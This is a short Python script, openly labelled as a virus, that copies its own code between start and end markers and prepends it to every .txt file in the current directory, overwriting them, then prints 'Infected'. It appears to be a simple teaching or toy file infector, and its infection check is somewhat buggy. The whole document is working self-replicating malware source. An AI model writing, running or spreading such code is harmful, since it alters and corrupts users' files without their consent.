## start of virus ##

import sys,glob
vcode = []

f = open(sys.argv[0],'r')
lines=f.readlines()
f.close()

invirus = False

for line in lines:
    if line == "## start of virus ##\n":
        invirus = True
    if invirus :
        vcode.append(line)
    if line == "## end of virus ##":
        break

py_files = glob.glob("*.txt")
# print(py_files)

for file in py_files:
    f = open(file, "r")
    pcode = f.readlines()
    f.close()
    infected = False

    for line in pcode:
        if line == "## start of virus ##":
            infected = True
            break
        if not infected:
            final_code = []
            final_code.extend(vcode)
            final_code.extend('\n')
            final_code.extend(pcode)
            f = open(file,"w")
            f.writelines(final_code)
            f.close()

## end of virus ##

#payload
print('Infected')